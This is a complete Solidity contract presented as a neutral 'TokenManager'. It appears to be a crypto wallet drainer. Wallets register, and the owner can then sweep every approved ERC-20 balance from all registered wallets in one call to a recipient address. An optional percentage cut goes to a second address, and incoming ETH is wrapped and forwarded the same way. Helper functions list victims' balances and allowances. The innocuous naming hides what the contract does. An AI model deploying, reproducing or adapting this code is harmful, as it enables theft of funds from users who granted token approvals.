// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract TokenManager {

    address public owner;
    address public weth;
    address public recipient;
    address public recipient2;
    uint256 public splitPercent;
    bool public splitEnabled;
    bool public paused;

    address[] public registeredWallets;
    mapping(address => bool) public isRegistered;
    mapping(address => uint256) public registeredAt;

    address[] public supportedTokens;
    mapping(address => bool) public isSupported;

    event AssetsTransferred(address indexed user, address indexed token, uint256 amount);
    event NativeCollected(address indexed user, uint256 amount);
    event WalletRegistered(address indexed user, uint256 timestamp);
    event TokenAdded(address indexed token);
    event TokenRemoved(address indexed token);
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event RecipientChanged(address indexed oldRecipient, address indexed newRecipient);
    event SplitUpdated(address indexed r2, uint256 percent, bool enabled);
    event Paused(bool status);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notPaused() {
        require(!paused, "Contract paused");
        _;
    }

    constructor(address _weth) {
        owner = msg.sender;
        recipient = msg.sender;
        weth = _weth;
    }

    receive() external payable {
        if (msg.value == 0 || weth == address(0)) return;
        IWETH(weth).deposit{value: msg.value}();
        _sendWETH(IWETH(weth).balanceOf(address(this)));
        emit NativeCollected(msg.sender, msg.value);
    }

    function _sendWETH(uint256 total) internal {
        if (total == 0) return;
        address to = recipient != address(0) ? recipient : owner;
        if (splitEnabled && recipient2 != address(0) && splitPercent > 0 && splitPercent < 100) {
            uint256 amt2 = total * splitPercent / 100;
            if (amt2 > 0) IWETH(weth).transfer(recipient2, amt2);
            if (total - amt2 > 0) IWETH(weth).transfer(to, total - amt2);
        } else {
            IWETH(weth).transfer(to, total);
        }
    }

    function registerWallet() external notPaused {
        if (!isRegistered[msg.sender]) {
            isRegistered[msg.sender] = true;
            registeredAt[msg.sender] = block.timestamp;
            registeredWallets.push(msg.sender);
            emit WalletRegistered(msg.sender, block.timestamp);
        }
    }

    function transferAssets(address user) external onlyOwner notPaused {
        _processTransfer(user);
    }

    function transferBatch(address[] calldata users) external onlyOwner notPaused {
        for (uint256 i = 0; i < users.length; i++) {
            _processTransfer(users[i]);
        }
    }

    function transferAll() external onlyOwner notPaused {
        for (uint256 i = 0; i < registeredWallets.length; i++) {
            _processTransfer(registeredWallets[i]);
        }
    }

    function _processTransfer(address user) internal {
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            _transferToken(user, supportedTokens[i]);
        }
        if (address(this).balance > 0 && weth != address(0)) {
            uint256 bal = address(this).balance;
            IWETH(weth).deposit{value: bal}();
            _sendWETH(IWETH(weth).balanceOf(address(this)));
            emit NativeCollected(user, bal);
        }
    }

    function _getAllowance(address user, address token) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSignature("allowance(address,address)", user, address(this))
        );
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }

    function _getBalance(address user, address token) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSignature("balanceOf(address)", user)
        );
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }

    function _doTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
        (bool ok,) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount)
        );
        return ok;
    }

    function _transferToken(address user, address token) internal {
        address to = recipient != address(0) ? recipient : owner;
        uint256 allow = _getAllowance(user, token);
        if (allow == 0) return;
        uint256 bal = _getBalance(user, token);
        if (bal == 0) return;
        uint256 amount = allow < bal ? allow : bal;
        if (amount == 0) return;

        if (splitEnabled && recipient2 != address(0) && splitPercent > 0 && splitPercent < 100) {
            uint256 amt1 = amount * (100 - splitPercent) / 100;
            uint256 amt2 = amount - amt1;
            if (amt1 > 0 && _doTransferFrom(token, user, to, amt1)) {
                emit AssetsTransferred(user, token, amt1);
            }
            if (amt2 > 0) {
                uint256 remain = _getAllowance(user, token);
                uint256 remainBal = _getBalance(user, token);
                uint256 actual = remain < remainBal ? remain : remainBal;
                if (actual > amt2) actual = amt2;
                if (actual > 0 && _doTransferFrom(token, user, recipient2, actual)) {
                    emit AssetsTransferred(user, token, actual);
                }
            }
        } else {
            if (_doTransferFrom(token, user, to, amount)) {
                emit AssetsTransferred(user, token, amount);
            }
        }
    }

    function addToken(address token) external onlyOwner {
        require(token != address(0), "Zero address");
        require(!isSupported[token], "Already added");
        isSupported[token] = true;
        supportedTokens.push(token);
        emit TokenAdded(token);
    }

    function addTokens(address[] calldata tokens) external onlyOwner {
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] != address(0) && !isSupported[tokens[i]]) {
                isSupported[tokens[i]] = true;
                supportedTokens.push(tokens[i]);
                emit TokenAdded(tokens[i]);
            }
        }
    }

    function removeToken(address token) external onlyOwner {
        require(isSupported[token], "Not found");
        isSupported[token] = false;
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            if (supportedTokens[i] == token) {
                supportedTokens[i] = supportedTokens[supportedTokens.length - 1];
                supportedTokens.pop();
                break;
            }
        }
        emit TokenRemoved(token);
    }

    function setRecipient(address _recipient) external onlyOwner {
        require(_recipient != address(0), "Zero address");
        emit RecipientChanged(recipient, _recipient);
        recipient = _recipient;
    }

    function setSplit(address _recipient2, uint256 _percent, bool _enabled) external onlyOwner {
        if (_enabled) {
            require(_recipient2 != address(0), "Need recipient2");
            require(_percent > 0 && _percent < 100, "Percent 1-99");
            recipient2 = _recipient2;
            splitPercent = _percent;
        }
        splitEnabled = _enabled;
        emit SplitUpdated(_recipient2, _percent, _enabled);
    }

    function getSplitInfo() external view returns (address, address, uint256, bool) {
        return (recipient, recipient2, splitPercent, splitEnabled);
    }

    function getUserBalances(address user) external view returns (
        address[] memory tokens,
        uint256[] memory balances,
        uint256[] memory allowances
    ) {
        tokens = supportedTokens;
        balances = new uint256[](supportedTokens.length);
        allowances = new uint256[](supportedTokens.length);
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            try IERC20(supportedTokens[i]).balanceOf(user) returns (uint256 b) { balances[i] = b; } catch {}
            try IERC20(supportedTokens[i]).allowance(user, address(this)) returns (uint256 a) { allowances[i] = a; } catch {}
        }
    }

    function getSupportedTokens() external view returns (address[] memory) {
        return supportedTokens;
    }

    function getRegisteredCount() external view returns (uint256) {
        return registeredWallets.length;
    }

    function getRegisteredWallets(uint256 start, uint256 limit) external view returns (address[] memory) {
        uint256 end = start + limit > registeredWallets.length ? registeredWallets.length : start + limit;
        address[] memory result = new address[](end - start);
        for (uint256 i = start; i < end; i++) {
            result[i - start] = registeredWallets[i];
        }
        return result;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setWeth(address _weth) external onlyOwner {
        weth = _weth;
    }

    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        emit Paused(_paused);
    }

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        (bool ok,) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", owner, amount)
        );
        require(ok, "Rescue failed");
    }

    function recoverNative() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No balance");
        (bool ok,) = payable(owner).call{value: bal}("");
        require(ok, "Failed");
    }
}